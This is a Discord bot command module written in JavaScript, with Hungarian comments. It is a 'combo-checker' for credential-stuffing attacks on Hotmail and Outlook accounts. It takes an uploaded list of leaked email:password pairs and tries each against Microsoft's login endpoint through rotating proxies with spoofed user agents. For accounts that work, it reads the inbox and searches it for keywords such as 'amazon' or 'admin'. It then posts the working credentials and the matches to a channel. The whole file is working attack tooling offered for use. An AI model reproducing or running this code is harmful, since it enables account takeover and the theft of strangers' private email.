const { SlashCommandBuilder, EmbedBuilder, AttachmentBuilder } = require('discord.js');
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const path = require('path');
const UserAgent = require('user-agents');

class ProxyManager {
    constructor(proxies) {
        this.proxies = proxies.filter(p => p.trim());
        this.current = 0;
    }
    
    getNext() {
        if (this.proxies.length === 0) return null;
        const proxy = this.proxies[this.current];
        this.current = (this.current + 1) % this.proxies.length;
        return proxy;
    }
}

async function checkCombo(email, password, keywords, proxy = null) {
    const ua = new UserAgent();
    
    try {
        // 🎯 MODERN MICROSOFT LOGIN (2024+)
        const loginResponse = await axios({
            method: 'POST',
            url: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
            data: new URLSearchParams({
                client_id: '00000000402b5328',
                scope: 'https://outlook.office.com/.default',
                grant_type: 'password',
                username: email,
                password: password
            }),
            timeout: 15000,
            headers: {
                'User-Agent': ua.toString(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json'
            },
            proxy: proxy ? {
                protocol: 'http',
                host: proxy.split(':')[0],
                port: parseInt(proxy.split(':')[1]) || 8080
            } : undefined
        });
        
        const responseData = loginResponse.data;
        const responseLower = JSON.stringify(responseData).toLowerCase();
        
        let valid = false;
        let keywordHits = [];
        let contacts = [];
        
        // ✅ SIKER JELEK
        if (responseData.access_token || 
            responseData.id_token || 
            !responseData.error ||
            responseLower.includes('outlook') ||
            responseLower.includes('office')) {
            valid = true;
        }
        
        // 🔍 LOGIN RESPONSE KEYWORDS
        keywords.forEach(keyword => {
            if (responseLower.includes(keyword.toLowerCase())) {
                keywordHits.push(keyword);
            }
        });
        
        // 📧 OUTLOOK ACCESS (valid fiókoknál)
        if (valid) {
            try {
                const outlookCheck = await axios({
                    method: 'GET',
                    url: 'https://outlook.office.com/api/v2.0/me/messages?$top=10',
                    headers: {
                        'User-Agent': ua.toString(),
                        'Authorization': `Bearer ${responseData.access_token}`,
                        'Accept': 'application/json'
                    },
                    timeout: 10000,
                    proxy: proxy ? {
                        protocol: 'http',
                        host: proxy.split(':')[0],
                        port: parseInt(proxy.split(':')[1]) || 8080
                    } : undefined
                });
                
                const messages = outlookCheck.data.value || [];
                messages.forEach(msg => {
                    const fromEmail = (msg.from?.emailAddress?.address || '').toLowerCase();
                    const subject = (msg.subject || '').toLowerCase();
                    
                    keywords.forEach(keyword => {
                        if (fromEmail.includes(keyword) || subject.includes(keyword)) {
                            contacts.push(`${fromEmail} (${subject.substring(0, 50)}...)`);
                        }
                    });
                });
                
            } catch (inboxErr) {
                // Fallback HTML scraping
                try {
                    const htmlCheck = await axios({
                        method: 'GET',
                        url: 'https://outlook.live.com/mail/0/inbox',
                        headers: {
                            'User-Agent': ua.toString(),
                            'Cookie': loginResponse.headers['set-cookie']?.join('; ') || ''
                        },
                        timeout: 8000,
                        proxy: proxy ? {
                            protocol: 'http',
                            host: proxy.split(':')[0],
                            port: parseInt(proxy.split(':')[1]) || 8080
                        } : undefined
                    });
                    
                    const $ = cheerio.load(htmlCheck.data);
                    $('a, span, div').each((i, el) => {
                        const text = $(el).text().toLowerCase();
                        if (text.includes('@') && text.length > 10) {
                            keywords.forEach(kw => {
                                if (text.includes(kw)) {
                                    contacts.push(text.trim());
                                }
                            });
                        }
                    });
                } catch (e2) {}
            }
        }
        
        console.log(`✅ [${email}] VALID=${valid} | KEYWORDS=${keywordHits.length} | CONTACTS=${contacts.length}`);
        return { valid, keywordHits, contacts: [...new Set(contacts)], proxy: proxy || 'DIRECT' };
        
    } catch (error) {
        const errorMsg = error.response?.data?.error_description || error.message;
        console.log(`❌ [${email}] ERROR: ${errorMsg}`);
        return { valid: false, keywordHits: [], contacts: [], proxy: proxy || 'DIRECT', error: errorMsg };
    }
}

module.exports = {
    data: new SlashCommandBuilder()
        .setName('combo-checker')
        .setDescription('🔥 ULTIMATE Hotmail Checker + Contacts')
        .addAttachmentOption(o => o.setName('combo').setDescription('email:pass lista').setRequired(true))
        .addStringOption(o => 
            o.setName('keywords')
             .setDescription('kulcsszavak (rockstar,amazon,admin)')
             .setRequired(true))
        .addAttachmentOption(o => o.setName('proxies').setDescription('ip:port lista').setRequired(false))
        .addChannelOption(o => o.setName('output').setDescription('eredmény channel').setRequired(false)),
    
    async execute(interaction, client) {
        await interaction.deferReply();
        client.activeChecks.set(interaction.guildId, true);
        
        const comboFile = interaction.options.getAttachment('combo');
        const proxyFile = interaction.options.getAttachment('proxies');
        const keywordsStr = interaction.options.getString('keywords');
        const outputChannel = interaction.options.getChannel('output') || interaction.channel;
        
        const keywords = keywordsStr.split(/[\s,]+/).map(k => k.trim().toLowerCase()).filter(k => k.length > 1);
        
        // Combo letöltés
        const comboBuffer = await fetch(comboFile.url).then(r => r.arrayBuffer());
        const combos = Buffer.from(comboBuffer).toString('utf-8')
            .split('\n')
            .map(l => l.trim())
            .filter(l => l.includes(':'))
            .map(l => {
                const [email, pass] = l.split(':', 2);
                return { email: email.toLowerCase().trim(), pass: (pass || '').trim() };
            })
            .filter(c => c.email.includes('@hotmail.com') || c.email.includes('@outlook.com'));
        
        // Proxy-k
        let proxies = [];
        if (proxyFile) {
            const proxyBuffer = await fetch(proxyFile.url).then(r => r.arrayBuffer());
            proxies = Buffer.from(proxyBuffer).toString('utf-8').split('\n').map(p => p.trim()).filter(Boolean);
        }
        
        const proxyManager = new ProxyManager(proxies);
        
        let stats = { total: combos.length, valid: 0, hits: 0, processed: 0 };
        let hitLines = [];
        let validLines = [];
        
        const progressEmbed = new EmbedBuilder()
            .setTitle('🔥 CHECKING...')
            .setColor(0x0099ff)
            .addFields(
                { name: '📊 Progress', value: '0 / ' + combos.length, inline: true },
                { name: '✅ Valid', value: '0', inline: true },
                { name: '🔥 Hits', value: '0', inline: true }
            );
        
        await interaction.editReply({ embeds: [progressEmbed] });
        
        for (let i = 0; i < combos.length; i++) {
            if (client.activeChecks.get(interaction.guildId) === false) break;
            
            const combo = combos[i];
            const result = await checkCombo(combo.email, combo.pass, keywords, proxyManager.getNext());
            stats.processed++;
            
            if (result.valid) {
                stats.valid++;
                const proxyInfo = result.proxy;
                const line = `${combo.email}:${combo.pass} | ${proxyInfo}`;
                
                if (result.keywordHits.length > 0 || result.contacts.length > 0) {
                    stats.hits++;
                    const hits = [...result.keywordHits, ...result.contacts].join(', ');
                    hitLines.push(`${line} | 🔥 ${hits}`);
                    
                    await outputChannel.send(`🔥 **HIT!** \`${combo.email}\` | ${hits}`);
                } else {
                    validLines.push(line);
                }
            }
            
            // Progress update (minden 5.)
            if (i % 5 === 0 || i === combos.length - 1) {
                progressEmbed.spliceFields(0, 3,
                    { name: '📊 Progress', value: `${stats.processed}/${combos.length}`, inline: true },
                    { name: '✅ Valid', value: stats.valid.toString(), inline: true },
                    { name: '🔥 Hits', value: stats.hits.toString(), inline: true }
                );
                await interaction.editReply({ embeds: [progressEmbed] });
            }
            
            await new Promise(r => setTimeout(r, 4000)); // Rate limit
        }
        
        const finalEmbed = new EmbedBuilder()
            .setTitle('✅ KÉSZ!')
            .setColor(0x00ff88)
            .addFields(
                { name: '📊 Vizsgált', value: stats.processed.toString(), inline: true },
                { name: '✅ Valid', value: stats.valid.toString(), inline: true },
                { name: '🔥 Hits', value: stats.hits.toString(), inline: true }
            );
        
        await interaction.followUp({ embeds: [finalEmbed] });
        
        // TXT fájlok
        const timestamp = Date.now();
        if (hitLines.length > 0) {
            const hitPath = path.join(__dirname, `hits_${timestamp}.txt`);
            fs.writeFileSync(hitPath, `🔥 HITS (${hitLines.length})\nKeywords: ${keywords.join(',')}\n\n` + hitLines.join('\n'));
            await outputChannel.send({ content: `📥 **${hitLines.length} ULTIMATE HITS!**`, files: [new AttachmentBuilder(hitPath)] });
            fs.unlinkSync(hitPath);
        }
        
        if (validLines.length > 0) {
            const validPath = path.join(__dirname, `valid_${timestamp}.txt`);
            fs.writeFileSync(validPath, `✅ VALID (${validLines.length})\n\n` + validLines.join('\n'));
            await outputChannel.send({ content: `📥 **${validLines.length} VALID FIOKOK**`, files: [new AttachmentBuilder(validPath)] });
            fs.unlinkSync(validPath);
        }
        
        client.activeChecks.delete(interaction.guildId);
    }
};
